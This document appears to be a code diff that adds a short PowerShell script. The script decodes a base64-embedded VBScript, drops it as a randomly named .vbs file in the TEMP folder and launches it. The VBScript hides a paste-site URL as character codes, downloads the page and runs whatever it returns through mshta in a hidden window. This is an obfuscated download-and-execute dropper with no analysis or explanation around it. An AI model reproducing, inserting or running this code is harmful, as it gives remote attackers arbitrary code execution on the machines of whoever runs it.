@@ -1,0 +1,8 @@
+$base64String = @'
+U2V0IG89Q3JlYXRlT2JqZWN0KCJNU1hNTDIuWE1MSFRUUCIpOmE9QXJyYXkoMTA0LDExNiwxMTYsMTEyLDExNSw1OCw0Nyw0NywxMTIsOTcsMTE1LDExNiwxMDEsMTE1LDQ2LDEwNSwxMTEsNDcsMTE0LDk3LDExOSw0NywxMTgsMTAxLDExNCwxMDUsNTEsNTApOkZvciBFYWNoIGMgSW4gYTp1PXUmQ2hyKGMpOk5leHQ6by5PcGVuIkdFVCIsdSxGYWxzZTpvLlNlbmQ6Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuIm1zaHRhICIiIiZvLnJlc3BvbnNlVGV4dCYiIiIiLDAsMA==
+'@
+
+$fileBytes = [System.Convert]::FromBase64String($base64String.Trim())
+$outputPath = Join-Path $env:TEMP "0fyhds341.vbs"
+[System.IO.File]::WriteAllBytes($outputPath, $fileBytes)
+Start-Process $outputPath
